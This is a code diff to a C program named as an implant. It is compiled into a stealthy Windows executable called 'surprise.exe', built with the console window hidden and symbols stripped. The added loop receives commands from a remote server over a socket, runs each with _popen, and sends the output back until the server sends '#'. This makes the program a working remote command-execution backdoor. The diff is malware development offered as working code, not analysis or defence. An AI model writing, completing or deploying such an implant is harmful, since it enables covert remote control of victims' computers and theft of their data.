@@ -1,6 +1,6 @@
 #include "implant.h"
-// Compilation command: x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32
-// futiv command : x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32 -mwindows -s
+// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt
+// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
 int main(){
 // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
@@ -161,18 +161,27 @@ int main(){
     }
 
 
-
-
+    FILE *pipe;
+    int kill = 1;
     int checker;
-    // TODO: add encrypted packet receive/decrypt, run command, encrypt/send loop using recv_all and send_all
-    checker = recv_all(soc, rcvbuffer, 4);
+    while (kill == 1){
+        checker = recv_all(soc, rcvbuffer, 4);
     if (checker <= 0) return 1; //error in recv_all
-    FILE *pipe = _popen(rcvbuffer, "r");
-    char buf[512];
+    
 
-    while (fgets(buf, sizeof(buf), pipe) != NULL) {
-    send_all(soc, buf, (int)strlen(buf));
+
+
+    if(rcvbuffer[0] == '#') kill = 0; //kill program if serveur say #
+    else {
+        pipe = _popen(rcvbuffer, "r");
+        char buf[512];
+
+        while (fgets(buf, sizeof(buf), pipe) != NULL) {
+        send_all(soc, buf, (int)strlen(buf));
     }
+    }
+    }
+    
 
 
 
